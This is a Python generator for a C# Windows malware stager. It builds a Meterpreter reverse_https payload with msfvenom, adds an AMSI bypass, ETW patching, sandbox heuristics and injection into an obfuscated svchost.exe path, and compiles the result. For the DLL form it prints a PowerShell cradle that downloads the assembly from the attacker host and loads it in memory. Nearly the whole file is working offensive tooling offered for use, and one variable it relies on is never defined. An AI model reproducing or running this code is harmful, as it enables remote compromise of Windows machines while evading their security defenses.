#!/bin/env python3
import ak
import os
import subprocess
import argparse

BASE_FILENAME = 'win_msf_stager'
FN_CS = BASE_FILENAME + ".cs"

MSFVENOM_CMD = f"msfvenom -p windows/x64/meterpreter/reverse_https LHOST={ak.LHOST} LPORT={ak.LPORT} -f raw -e generic/none"

templates = {
  'exe': """
using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace LeMans
{{
    public class Stager
    {{
    {imports}
        public static void Main()
        {{
        {main_code}
        }}

    }}
}}
""",
  'dll': """
using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace LeMans
{{
    public class Class1
    {{
        {imports}

        public static void ferrari()
        {{
          {main_code}

        }}
    }}
}}
"""
}

def get_shellcode(msfvenom_cmd):
  shellcode = subprocess.check_output(msfvenom_cmd, shell=True)

  return shellcode

def generate(args):
  url_dl_code = ak.URL_DL_CODE.format(STAGER_URL=ak.STAGER_URL)

  # Create obfuscator for loaders that need obfuscation
  exe_path = b"C:\\\\Windows\\system32\\svchost.exe"
  path_obfuscated = ak.Obfuscator(exe_path, b'\x09')

  imports = f"""{ak.ARCH_DETECTION}"""
  main_code = f"""{url_dl_code}"""

  if args.heuristics:
    imports += f"{ak.HEURISTICS_IMPORT}"
    main_code += f"{ak.HEURISTICS_CODE}"

  if args.etw:
    imports += f"{ak.ETW_FUNCS}"
    main_code += f"{ak.ETW_PATCH}"

  if args.amsi:
    imports += f"{ak.AMSI_BYPASS_IMPORT}"
    main_code += f"{ak.AMSI_BYPASS_CODE}"

  imports += ak.import_choices[args.injection]
  main_code += ak.main_choices[args.injection].format(ak=ak,
                                                      xor_path=path_obfuscated.get_hex_csharp(),
                                                      xor_key=path_obfuscated.get_key_csharp())

  # Make csharp template
  template = templates[args.format].format(imports=imports,main_code=main_code)
  ak.write_file(FN_CS, template)


def generate_shellcode():
  shellcode = get_shellcode(MSFVENOM_CMD)
  ak.write_file(FN_SHELLCODE, shellcode)

def main():
  # generate_shellcode()

  parser = argparse.ArgumentParser()
  parser.add_argument('--injection', '-i', default='standard', choices=ak.main_choices.keys())
  parser.add_argument('--format', '-f', default='exe', choices=['exe', 'dll'])
  parser.add_argument('--heuristics', default=True, action=argparse.BooleanOptionalAction)
  parser.add_argument('--amsi', default=False, action=argparse.BooleanOptionalAction)
  parser.add_argument('--etw', default=True, action=argparse.BooleanOptionalAction)

  args = parser.parse_args()

  generate(args)

  flags = ""

  if args.format == 'dll':
    flags = "/target:library"

  ak.cs_compile(FN_CS, flags=flags)

  if args.format == 'dll':
      print("Load with:")
      ps = """
      $data = (New-Object System.Net.WebClient).DownloadData('http://{lhost}/{fn}')
      $assem = [System.Reflection.Assembly]::Load($data)

      $class = $assem.GetType('LeMans.Class1')
      $method = $class.GetMethod("ferrari")
      $method.Invoke(0, $null)
      """.format(fn=BASE_FILENAME + '.dll', lhost=ak.LHOST)
      print(ps)

if __name__ == "__main__":
  main()
